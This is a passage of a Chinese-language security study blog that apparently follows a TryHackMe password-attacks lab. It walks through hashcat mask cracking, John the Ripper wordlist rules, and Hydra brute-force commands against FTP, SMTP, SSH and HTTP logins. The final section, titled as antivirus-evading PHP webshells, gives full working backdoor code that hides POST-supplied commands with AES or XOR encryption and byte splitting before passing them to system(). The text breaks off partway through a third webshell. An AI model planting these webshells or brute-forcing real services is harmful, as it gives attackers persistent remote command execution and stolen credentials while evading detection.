<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Name........: MD5</span><br><span class="line">Hash.Target......: 05a5cf06982ba7892ed2a6d38fe832d6</span><br><span class="line">Time.Started.....: Mon Oct 11 10:54:06 2021 (0 secs)</span><br><span class="line">Time.Estimated...: Mon Oct 11 10:54:06 2021 (0 secs)</span><br><span class="line">Guess.Mask.......: ?d?d?d?d [4]</span><br><span class="line">Recovered........: 1/1 (100.00%) Digests</span><br><span class="line">Progress.........: 10000/10000 (100.00%)</span><br><span class="line">Candidates.#1....: 1234 -&gt; 6764</span><br></pre></td></tr></table></figure>

<p>最终破解出的密码是 <strong>2021</strong>。</p>
<hr>
<h4 id="总结-3"><a href="#总结-3" class="headerlink" title="总结"></a><strong>总结</strong></h4><ul>
<li><strong>字典攻击</strong> 依赖于预先准备好的单词列表，适用于常见或弱密码的破解。</li>
<li><strong>暴力破解攻击</strong> 尝试所有可能的字符组合，适用于短而复杂的密码（如 PIN 码）。</li>
<li><strong>Hashcat</strong> 提供了强大的功能，支持多种哈希类型和攻击模式。</li>
</ul>
<p>在实际环境中，安全实践应避免使用 <strong>弱密码</strong>，并结合 <strong>多因素认证（MFA）</strong> 以提高安全性。</p>
<h3 id="离线攻击2"><a href="#离线攻击2" class="headerlink" title="离线攻击2"></a>离线攻击2</h3><h4 id="规则攻击（Rule-Based-Attacks）"><a href="#规则攻击（Rule-Based-Attacks）" class="headerlink" title="规则攻击（Rule-Based Attacks）"></a>规则攻击（Rule-Based Attacks）</h4><p>规则攻击（Rule-Based Attacks）也被称为<strong>混合攻击（Hybrid Attacks）</strong>。规则攻击假设攻击者对密码策略有所了解，并通过应用规则来生成符合密码策略的密码。理论上，这种方法应该只会生成符合要求的有效密码。<br> 使用现有的**密码字典（wordlists）**可以帮助我们生成符合密码策略的密码，例如对**password**进行变形（mangling）：</p>
<ul>
<li><code>p@ssword</code></li>
<li><code>Pa$$word</code></li>
<li><code>Passw0rd</code><br>等等。</li>
</ul>
<p>在这类攻击中，我们可以使用<strong>Hashcat</strong>或<strong>John the Ripper</strong>来扩展我们的密码字典。但在本次实验中，我们主要使用<strong>John the Ripper</strong>。<br> 通常，John the Ripper 的配置文件中包含<strong>规则集（rule sets）</strong>，文件路径可能位于：</p>
<ul>
<li><code>/etc/john/john.conf</code></li>
<li><code>/opt/john/john.conf</code><br>具体位置取决于你的 Linux 发行版或 John the Ripper 的安装方式。</li>
</ul>
<p>我们可以查看 <code>john.conf</code> 文件，找到可用的<strong>规则列表（List.Rules）</strong>：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user@machine$ cat /etc/john/john.conf | grep &quot;List.Rules:&quot; | cut -d&quot;.&quot; -f3 | cut -d&quot;:&quot; -f2 | cut -d&quot;]&quot; -f1 | awk NF</span><br></pre></td></tr></table></figure>

<p>示例输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">JumboSingle</span><br><span class="line">o1</span><br><span class="line">o2</span><br><span class="line">i1</span><br><span class="line">i2</span><br><span class="line">best64</span><br><span class="line">d3ad0ne</span><br><span class="line">dive</span><br><span class="line">InsidePro</span><br><span class="line">T0XlC</span><br><span class="line">rockyou-30000</span><br><span class="line">specific</span><br><span class="line">ShiftToggle</span><br><span class="line">Split</span><br><span class="line">Single</span><br><span class="line">Extra</span><br><span class="line">OldOffice</span><br><span class="line">Single-Extra</span><br><span class="line">Wordlist</span><br><span class="line">Multiword</span><br><span class="line">Jumbo</span><br><span class="line">KoreLogic</span><br><span class="line">T9</span><br></pre></td></tr></table></figure>

<p>可以看到，John the Ripper 提供了许多可用的规则。接下来，我们将创建一个仅包含 <code>tryhackme</code> 的密码字典，并使用<strong>best64 规则</strong>来扩展这个字典。</p>
<h5 id="使用-best64-规则扩展密码字典"><a href="#使用-best64-规则扩展密码字典" class="headerlink" title="使用 best64 规则扩展密码字典"></a>使用 <code>best64</code> 规则扩展密码字典</h5><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user@machine$ john --wordlist=/tmp/single-password-list.txt --rules=best64 --stdout | wc -l</span><br></pre></td></tr></table></figure>

<p>示例输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">76p 0:00:00:00 100.00% (2021-10-11 13:42) 1266p/s pordpo</span><br><span class="line">76</span><br></pre></td></tr></table></figure>

<p>命令解析：</p>
<ul>
<li><code>--wordlist=</code> 指定密码字典文件</li>
<li><code>--rules=</code> 选择使用的规则</li>
<li><code>--stdout</code> 将生成的密码直接输出到终端</li>
<li><code>| wc -l</code> 计算生成的密码数量</li>
</ul>
<p>运行此命令后，我们的密码列表从<strong>1个</strong>扩展到了<strong>76个</strong>。</p>
<h5 id="使用-KoreLogic-规则扩展密码"><a href="#使用-KoreLogic-规则扩展密码" class="headerlink" title="使用 KoreLogic 规则扩展密码"></a>使用 <code>KoreLogic</code> 规则扩展密码</h5><p><code>KoreLogic</code> 规则集包含了多种内置和自定义规则，可以生成更复杂的密码。<br> 我们使用 <code>KoreLogic</code> 规则，并检查 <code>Tryh@ckm3</code> 是否包含在生成的密码列表中。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user@machine$ john --wordlist=single-password-list.txt --rules=KoreLogic --stdout | grep &quot;Tryh@ckm3&quot;</span><br></pre></td></tr></table></figure>

<p>示例输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">Tryh@ckm3</span><br><span class="line">7089833p 0:00:00:02 100.00% (2021-10-11 13:56) 3016Kp/s tryhackme999999</span><br></pre></td></tr></table></figure>

<p>我们可以看到，<code>Tryh@ckm3</code> 已成功生成。这说明 <code>KoreLogic</code> 规则能够创建更复杂的密码。</p>
<hr>
<h4 id="自定义规则（Custom-Rules）"><a href="#自定义规则（Custom-Rules）" class="headerlink" title="自定义规则（Custom Rules）"></a><strong>自定义规则（Custom Rules）</strong></h4><p>John the Ripper 允许我们<strong>自定义规则</strong>，可以在<strong>破解哈希时动态使用</strong>，或<strong>用于生成自定义密码字典</strong>。</p>
<h5 id="示例：自定义规则"><a href="#示例：自定义规则" class="headerlink" title="示例：自定义规则"></a><strong>示例：自定义规则</strong></h5><p>假设我们希望对现有的密码字典进行修改，使得每个密码：</p>
<ul>
<li>在<strong>前面</strong>添加<strong>特殊字符</strong>（<code>!@#$*&amp;</code>）</li>
<li>在<strong>后面</strong>添加<strong>0-9 的数字</strong></li>
</ul>
<p>密码格式示例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[symbols]word[0-9]</span><br></pre></td></tr></table></figure>

<p>我们可以在 <code>john.conf</code> 文件末尾添加自定义规则：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user@machine$ sudo vi /etc/john/john.conf</span><br></pre></td></tr></table></figure>

<p>在文件中添加以下内容：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[List.Rules:THM-Password-Attacks]</span><br><span class="line">Az&quot;[0-9]&quot; ^[!@#$]</span><br></pre></td></tr></table></figure>

<p>规则解析：</p>
<ul>
<li><code>[List.Rules:THM-Password-Attacks]</code> 定义新规则的名称 <code>THM-Password-Attacks</code></li>
<li><code>Az</code> 代表从字典中提取单词</li>
<li><code>&quot;[0-9]&quot;</code> 在密码后<strong>追加</strong>一个数字（0-9）</li>
<li><code>^[!@#$]</code> 在密码前<strong>添加</strong>一个特殊字符（!@#$）<ul>
<li><code>^</code> 代表在开头插入字符</li>
<li>如果改成 <code>$</code>，则会在结尾插入字符</li>
</ul>
</li>
</ul>
<h5 id="测试自定义规则"><a href="#测试自定义规则" class="headerlink" title="测试自定义规则"></a><strong>测试自定义规则</strong></h5><p>首先，创建一个包含单词 <code>password</code> 的测试字典：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user@machine$ echo &quot;password&quot; &gt; /tmp/single.lst</span><br></pre></td></tr></table></figure>

<p>使用 <code>THM-Password-Attacks</code> 规则扩展密码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user@machine$ john --wordlist=/tmp/single.lst --rules=THM-Password-Attacks --stdout</span><br></pre></td></tr></table></figure>

<p>示例输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Using default input encoding: UTF-8</span><br><span class="line">!password0</span><br><span class="line">@password0</span><br><span class="line">#password0</span><br><span class="line">$password0</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="总结-4"><a href="#总结-4" class="headerlink" title="总结"></a><strong>总结</strong></h4><ol>
<li><strong>规则攻击</strong>（Rule-Based Attacks）利用已知的密码策略进行变形，生成符合策略的密码。</li>
<li>John the Ripper 提供了<strong>多种内置规则</strong>（如 <code>best64</code>、<code>KoreLogic</code>），可用于扩展密码字典。</li>
<li><strong>自定义规则</strong>可在 <code>john.conf</code> 配置文件中定义，以更精确地控制密码的生成方式。</li>
<li>通过 <code>--stdout</code> 选项，可以直接查看规则生成的密码列表，便于测试和优化策略。</li>
</ol>
<p>现在，你可以尝试创建自己的<strong>自定义规则</strong>，进一步优化你的密码字典！</p>
<h3 id="在线密码攻击"><a href="#在线密码攻击" class="headerlink" title="在线密码攻击"></a>在线密码攻击</h3><p>在线密码攻击是指针对使用用户名和密码身份验证方案的网络服务进行密码猜测攻击，其中包括 HTTP、SSH、VNC、FTP、SNMP、POP3 等服务。本节将介绍使用 Hydra 这一常见工具对各种网络服务的登录系统进行攻击。</p>
<h4 id="Hydra"><a href="#Hydra" class="headerlink" title="Hydra"></a>Hydra</h4><p>Hydra 支持对多种网络服务进行攻击。在本节中，我们将使用 Hydra 对网络服务（如 Web 登录页面、FTP、SMTP 和 SSH）进行暴力破解。在 Hydra 中，每种服务都有其特定的选项，因此熟悉其语法需要一定的学习成本。建议在使用时查阅帮助选项，以了解更多信息和功能。</p>
<h4 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h4><p>在以下场景中，我们将对 FTP 服务器进行暴力破解。通过查看 Hydra 的帮助选项，我们可以得知攻击 FTP 服务器的命令语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">user@machine$ hydra -l ftp -P passlist.txt ftp://10.10.x.x</span><br></pre></td></tr></table></figure>

<p><strong>参数解析：</strong></p>
<ul>
<li><code>-l ftp</code> 指定单个用户名，使用 <code>-L</code> 选项可以指定包含多个用户名的字典文件。</li>
<li><code>-P</code> 指定密码字典文件的完整路径，若要指定单个密码，则使用 <code>-p</code> 选项。</li>
<li><code>ftp://10.10.x.x</code> 指定协议及目标的 IP 地址或完整域名（FQDN）。</li>
</ul>
<p>请记住，在尝试暴力破解之前，可以先尝试默认凭据。有时无需暴力破解就能成功访问目标。请尝试攻击附带的虚拟机上的 FTP 服务器，并回答问题。</p>
<h4 id="SMTP"><a href="#SMTP" class="headerlink" title="SMTP"></a>SMTP</h4><p>与 FTP 服务器类似，我们也可以使用 Hydra 对 SMTP 服务器进行暴力破解，语法与前述示例类似，唯一不同的是目标协议。请注意，如果要尝试使用其他在线密码攻击工具，可能需要手动指定端口号，例如 SMTP 的默认端口号为 <code>25</code>。建议先查阅工具的帮助选项。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">user@machine$ hydra -l email@company.xyz -P /path/to/wordlist.txt smtp://10.10.x.x -v</span><br></pre></td></tr></table></figure>

<p>示例输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">less复制编辑Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-13 03:41:08</span><br><span class="line">[INFO] 多个服务提供商已实施破解保护，建议先使用较小的字典文件进行测试，并确保操作合法！</span><br><span class="line">[DATA] 每台服务器最多允许 7 个并行任务，总共 7 个任务，7 次登录尝试（l:1/p:7），约 1 次尝试/任务</span><br><span class="line">[DATA] 攻击目标 smtp://10.10.x.x:25/</span><br><span class="line">[VERBOSE] 解析地址中… [VERBOSE] 解析完成</span><br><span class="line">[VERBOSE] 使用 SMTP LOGIN 认证机制</span><br><span class="line">[25][smtp] 目标主机: 10.10.x.x   用户名: email@company.xyz   密码: xxxxxxxx</span><br><span class="line">[STATUS] 目标 10.10.x.x 的攻击完成（等待所有子任务执行完毕）</span><br><span class="line">1 个目标成功破解，找到 1 组有效凭据</span><br></pre></td></tr></table></figure>

<h4 id="SSH"><a href="#SSH" class="headerlink" title="SSH"></a>SSH</h4><p>如果服务器暴露在互联网上，SSH 暴力破解是一种常见的攻击方式。Hydra 支持多种协议，包括 SSH。可以使用类似的命令进行 SSH 攻击。请注意，密码攻击依赖于高质量的字典文件，以提高破解成功率。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">user@machine$ hydra -L users.lst -P /path/to/wordlist.txt ssh://10.10.x.x -v</span><br></pre></td></tr></table></figure>

<p>示例输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">csharp复制编辑Hydra v8.6 (c) 2017 by van Hauser/THC - 请勿在军事、秘密机构或非法用途下使用。</span><br><span class="line"></span><br><span class="line">Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-10-13 03:48:00</span><br><span class="line">[WARNING] 许多 SSH 配置限制了并行任务数量，建议减少任务数：使用 -t 4</span><br><span class="line">[DATA] 每台服务器最多允许 8 个并行任务，总共 8 个任务，8 次登录尝试（l:1/p:8），约 1 次尝试/任务</span><br><span class="line">[DATA] 攻击目标 ssh://10.10.x.x:22/</span><br><span class="line">[VERBOSE] 解析地址中… [VERBOSE] 解析完成</span><br><span class="line">[INFO] 测试是否支持 SSH 密码认证 ssh://user@10.10.x.x:22</span><br><span class="line">[INFO] 成功，目标支持 SSH 密码认证</span><br><span class="line">[22][ssh] 目标主机: 10.10.x.x   用户名: victim   密码: xxxxxxxx</span><br><span class="line">[STATUS] 目标 10.10.x.x 的攻击完成（等待所有子任务执行完毕）</span><br><span class="line">1 个目标成功破解，找到 1 组有效凭据</span><br></pre></td></tr></table></figure>

<h4 id="HTTP-登录页面"><a href="#HTTP-登录页面" class="headerlink" title="HTTP 登录页面"></a>HTTP 登录页面</h4><p>在此场景中，我们将对 HTTP 登录页面进行暴力破解。首先，需要了解攻击目标的请求类型。使用 Hydra 时，必须明确 HTTP 请求类型（GET 或 POST）。可以使用 <code>hydra http-get-form -U</code> 查看相关选项。</p>
<p>Hydra 针对 <code>http-get-form</code> 选项的基本语法如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">php-template</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">&lt;url&gt;:&lt;表单参数&gt;:&lt;条件字符串&gt;[:&lt;可选项&gt;[:&lt;可选项&gt;]]</span><br></pre></td></tr></table></figure>

<p>我们需要分析需要发送的 HTTP 请求，可以使用浏览器开发者工具或 Burp Suite 进行分析。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">bash</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">复制编辑</span><br><span class="line">user@machine$ hydra -l admin -P 500-worst-passwords.txt 10.10.x.x http-get-form &quot;/login-get/index.php:username=^USER^&amp;password=^PASS^:S=logout.php&quot; -f</span><br></pre></td></tr></table></figure>

<p>示例输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">csharp复制编辑Hydra v8.6 (c) 2017 by van Hauser/THC - 请勿在军事、秘密机构或非法用途下使用。</span><br><span class="line"></span><br><span class="line">Hydra (http://www.thc.org/thc-hydra) starting at 2021-10-13 08:06:22 </span><br><span class="line">[DATA] 每台服务器最多允许 16 个并行任务，总共 16 个任务，500 次登录尝试（l:1/p:500），约 32 次尝试/任务 </span><br><span class="line">[DATA] 攻击目标 http-get-form://10.10.x.x:80//login-get/index.php:username=^USER^&amp;password=^PASS^:S=logout.php </span><br><span class="line">[80][http-get-form] 目标主机: 10.10.x.x   用户名: admin   密码: xxxxxx </span><br><span class="line">1 个目标成功破解，找到 1 组有效凭据 </span><br><span class="line">Hydra (http://www.thc.org/thc-hydra) </span><br><span class="line">finished at 2021-10-13 08:06:45</span><br></pre></td></tr></table></figure>

<p><strong>参数解析：</strong></p>
<ul>
<li><code>-l admin</code> 指定单个用户名，使用 <code>-L</code> 选项可以指定用户名字典文件。</li>
<li><code>-P</code> 指定密码字典文件的完整路径，若要指定单个密码，则使用 <code>-p</code> 选项。</li>
<li><code>10.10.x.x</code> 目标的 IP 地址或完整域名（FQDN）。</li>
<li><code>http-get-form</code> 指定 HTTP 请求类型，可选择 <code>http-get-form</code> 或 <code>http-post-form</code>。</li>
<li><code>/login-get/index.php</code> 目标 Web 服务器上登录页面的路径。</li>
<li><code>username=^USER^&amp;password=^PASS^</code> 需要暴力破解的参数，<code>^USER^</code> 代表用户名，<code>^PASS^</code> 代表密码，将分别从字典文件中提取值。</li>
<li><code>S=logout.php</code> 指定成功条件，例如成功登录后会出现 <code>logout.php</code>，Hydra 可以据此判断有效凭据。</li>
<li><code>-f</code> 选项在找到有效用户名和密码后立即停止暴力破解攻击。</li>
</ul>
<p>可以在提供的虚拟机上尝试访问 <code>http://MACHINE_IP/login-get/index.php</code> 进行测试，确保已经部署了虚拟机以回答相关问题。</p>
<h4 id="其他在线密码攻击工具"><a href="#其他在线密码攻击工具" class="headerlink" title="其他在线密码攻击工具"></a>其他在线密码攻击工具</h4><p>除了 Hydra 之外，还可以尝试其他在线密码攻击工具，以扩展知识面：</p>
<ul>
<li><strong>Medusa</strong></li>
<li><strong>Ncrack</strong></li>
<li>其他工具！</li>
</ul>
<h3 id="免杀webshell-php"><a href="#免杀webshell-php" class="headerlink" title="免杀webshell(php)"></a>免杀webshell(php)</h3><h4 id="采用反序列化-自定义加密解密函数绕过-分块加密"><a href="#采用反序列化-自定义加密解密函数绕过-分块加密" class="headerlink" title="采用反序列化+自定义加密解密函数绕过+分块加密"></a>采用反序列化+自定义加密解密函数绕过+分块加密</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 序列化函数</span><br><span class="line">function serializeData($num1, $num2)</span><br><span class="line">&#123;</span><br><span class="line">    // 创建一个关联数组来存储数据</span><br><span class="line">    $data = [</span><br><span class="line">        &quot;num1&quot; =&gt; $num1,</span><br><span class="line">        &quot;num2&quot; =&gt; $num2</span><br><span class="line">    ];</span><br><span class="line">    // 使用PHP的serialize函数将数组序列化为字符串</span><br><span class="line">    return serialize($data);</span><br><span class="line">&#125;</span><br><span class="line">// 反序列化函数</span><br><span class="line">function unserializeData($serializedString)</span><br><span class="line">&#123;</span><br><span class="line">    // 使用PHP的unserialize函数将字符串反序列化为数组</span><br><span class="line">    $data = unserialize($serializedString);</span><br><span class="line">    return $data;</span><br><span class="line">&#125;</span><br><span class="line">// 示例：序列化和反序列化</span><br><span class="line">function get_data()</span><br><span class="line">&#123;</span><br><span class="line">    $num1 = $_POST[&quot;num1&quot;] ?? null;  // 获取num1，如果没有则为null</span><br><span class="line">    $num2 = $_POST[&quot;num2&quot;] ?? null;  // 获取num2，如果没有则为null</span><br><span class="line">    return array($num1, $num2);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function get_system()</span><br><span class="line">&#123;</span><br><span class="line">    $a = &quot;sysaers&quot;;</span><br><span class="line">    $b = &quot;tem&quot;;</span><br><span class="line">&#125;</span><br><span class="line">function encrypt($data, $key)</span><br><span class="line">&#123;</span><br><span class="line">    $method = &quot;AES-256-CBC&quot;;</span><br><span class="line">    $iv = openssl_random_pseudo_bytes(openssl_cipher_iv_length($method));</span><br><span class="line">    $encrypted = openssl_encrypt($data, $method, $key, 0, $iv);</span><br><span class="line">    return base64_encode($iv . $encrypted);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 解密函数</span><br><span class="line">function decrypt($encrypted, $key)</span><br><span class="line">&#123;</span><br><span class="line">    $data = base64_decode($encrypted);</span><br><span class="line">    $ivLength = openssl_cipher_iv_length(&quot;AES-256-CBC&quot;);</span><br><span class="line">    $iv = substr($data, 0, $ivLength);</span><br><span class="line">    $encryptedData = substr($data, $ivLength);</span><br><span class="line">    return openssl_decrypt($encryptedData, &quot;AES-256-CBC&quot;, $key, 0, $iv);</span><br><span class="line">&#125;</span><br><span class="line">function splitData($data)</span><br><span class="line">&#123;</span><br><span class="line">    $part1 = &quot;&quot;;</span><br><span class="line">    $part2 = &quot;&quot;;</span><br><span class="line">    for ($i = 0; $i &lt; strlen($data); $i++) &#123;</span><br><span class="line">        $byte = ord($data[$i]);</span><br><span class="line">        $part1 .= chr($byte &amp; 0x0F);  // 保留低4位</span><br><span class="line">        $part2 .= chr($byte &amp; 0xF0);  // 保留高4位</span><br><span class="line">    &#125;</span><br><span class="line">    return [$part1, $part2];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 合并数据</span><br><span class="line">function mergeData($part1, $part2)</span><br><span class="line">&#123;</span><br><span class="line">    $merged = &quot;&quot;;</span><br><span class="line">    for ($i = 0; $i &lt; strlen($part1); $i++) &#123;</span><br><span class="line">        $byte1 = ord($part1[$i]);</span><br><span class="line">        $byte2 = ord($part2[$i]);</span><br><span class="line">        $merged .= chr($byte1 | $byte2);  // 按位或合并</span><br><span class="line">    &#125;</span><br><span class="line">    return $merged;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 序列化数据</span><br><span class="line">$key = &quot;my_secret_key_1234567890&quot;;</span><br><span class="line">$data1 = get_data();</span><br><span class="line">$data2 = $data1[0];</span><br><span class="line">list($part1, $part2) = splitData($data2);</span><br><span class="line">$encryptedPart1 = encrypt($part1, $key);</span><br><span class="line">$encryptedPart2 = encrypt($part2, $key);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 解密两部分数据</span><br><span class="line">$decryptedPart1 = decrypt($encryptedPart1, $key);</span><br><span class="line">$decryptedPart2 = decrypt($encryptedPart2, $key);</span><br><span class="line">$message = &quot;&quot;;</span><br><span class="line">$mergedData = mergeData($decryptedPart1, $decryptedPart2);</span><br><span class="line">system($mergedData, $message);</span><br><span class="line">echo $message;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="自定义加解密key-反序列化"><a href="#自定义加解密key-反序列化" class="headerlink" title="自定义加解密key+反序列化"></a>自定义加解密key+反序列化</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 序列化函数</span><br><span class="line">function serializeData($num1, $num2)</span><br><span class="line">&#123;</span><br><span class="line">    $data = [</span><br><span class="line">        &quot;num1&quot; =&gt; $num1,</span><br><span class="line">        &quot;num2&quot; =&gt; $num2</span><br><span class="line">    ];</span><br><span class="line">    return serialize($data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 反序列化函数</span><br><span class="line">function unserializeData($serializedString)</span><br><span class="line">&#123;</span><br><span class="line">    return unserialize($serializedString);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// XOR 加密函数</span><br><span class="line">function xorEncrypt($data, $key)</span><br><span class="line">&#123;</span><br><span class="line">    $encrypted = &#x27;&#x27;;</span><br><span class="line">    $keyLength = strlen($key);</span><br><span class="line">    for ($i = 0; $i &lt; strlen($data); $i++) &#123;</span><br><span class="line">        $encrypted .= $data[$i] ^ $key[$i % $keyLength];</span><br><span class="line">    &#125;</span><br><span class="line">    return base64_encode($encrypted);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// XOR 解密函数</span><br><span class="line">function xorDecrypt($encryptedData, $key)</span><br><span class="line">&#123;</span><br><span class="line">    $data = base64_decode($encryptedData);</span><br><span class="line">    $decrypted = &#x27;&#x27;;</span><br><span class="line">    $keyLength = strlen($key);</span><br><span class="line">    for ($i = 0; $i &lt; strlen($data); $i++) &#123;</span><br><span class="line">        $decrypted .= $data[$i] ^ $key[$i % $keyLength];</span><br><span class="line">    &#125;</span><br><span class="line">    return $decrypted;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 获取 POST 数据并加密</span><br><span class="line">function get_post()</span><br><span class="line">&#123;</span><br><span class="line">    if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;POST&#x27;) &#123;</span><br><span class="line">        $k = $&#123;&quot;_PO&quot; . &quot;ST&quot;&#125;[&quot;num1&quot;];</span><br><span class="line">        $B = $&#123;&quot;_PO&quot; . &quot;ST&quot;&#125;[&quot;num2&quot;];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        // 序列化数据</span><br><span class="line">        $serializedData = serializeData($k, $B);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        // 加密密钥</span><br><span class="line">        $key = &quot;your-secret-key&quot;; // 密钥可以是任意字符串</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        // 使用 XOR 加密序列化后的数据</span><br><span class="line">        $encryptedData = xorEncrypt($serializedData, $key);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        return $encryptedData;</span><br><span class="line">    &#125;</span><br><span class="line">    return null;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 解密和反序列化</span><br><span class="line">function decryptAndUnserialize($encryptedData, $key)</span><br><span class="line">&#123;</span><br><span class="line">    // 解密数据</span><br><span class="line">    $decryptedData = xorDecrypt($encryptedData, $key);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    // 反序列化数据</span><br><span class="line">    $data = unserializeData($decryptedData);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    return $data;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 示例：获取加密数据并解密</span><br><span class="line">function getdata()</span><br><span class="line">&#123;</span><br><span class="line">    if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;POST&#x27;) &#123;</span><br><span class="line">        // 获取加密数据</span><br><span class="line">        $encryptedData = get_post();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        // 解密密钥</span><br><span class="line">        $key = &quot;your-secret-key&quot;; // 必须与加密时一致</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        // 解密并反序列化</span><br><span class="line">        $decryptedData = decryptAndUnserialize($encryptedData, $key);</span><br><span class="line">        echo $decryptedData[&quot;num1&quot;];</span><br><span class="line">        $message = &#x27;&#x27;;</span><br><span class="line">        system($decryptedData[&quot;num1&quot;], $message);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        // 输出解密后的数据</span><br><span class="line">        print_r($message);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">getdata();</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<h4 id="魔法函数-自定义加解密"><a href="#魔法函数-自定义加解密" class="headerlink" title="魔法函数+自定义加解密"></a>魔法函数+自定义加解密</h4><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">// 序列化函数</span><br><span class="line">function serializeData($num1, $num2)</span><br><span class="line">&#123;</span><br><span class="line">    $data = [</span><br><span class="line">        &quot;num1&quot; =&gt; $num1,</span><br><span class="line">        &quot;num2&quot; =&gt; $num2</span><br><span class="line">    ];</span><br><span class="line">    return serialize($data);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 反序列化函数</span><br><span class="line">function unserializeData($serializedString)</span><br><span class="line">&#123;</span><br><span class="line">    return unserialize($serializedString);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// XOR 加密函数</span><br><span class="line">function xorEncrypt($data, $key)</span><br><span class="line">&#123;</span><br><span class="line">    $encrypted = &#x27;&#x27;;</span><br><span class="line">    $keyLength = strlen($key);</span><br><span class="line">    for ($i = 0; $i &lt; strlen($data); $i++) &#123;</span><br><span class="line">        $encrypted .= $data[$i] ^ $key[$i % $keyLength];</span><br><span class="line">    &#125;</span><br><span class="line">    return base64_encode($encrypted);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// XOR 解密函数</span><br><span class="line">function xorDecrypt($encryptedData, $key)</span><br><span class="line">&#123;</span><br><span class="line">    $data = base64_decode($encryptedData);</span><br><span class="line">    $decrypted = &#x27;&#x27;;</span><br><span class="line">    $keyLength = strlen($key);</span><br><span class="line">    for ($i = 0; $i &lt; strlen($data); $i++) &#123;</span><br><span class="line">        $decrypted .= $data[$i] ^ $key[$i % $keyLength];</span><br><span class="line">    &#125;</span><br><span class="line">    return $decrypted;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">// 获取 POST 数据并加密</span><br><span class="line">function get_post()</span><br><span class="line">&#123;</span><br><span class="line">    if ($_SERVER[&#x27;REQUEST_METHOD&#x27;] === &#x27;POST&#x27;) &#123;</span><br><span class="line">        $k = $&#123;&quot;_PO&quot; . &quot;ST&quot;&#125;[&quot;num1&quot;];</span><br><span class="line">        $B = 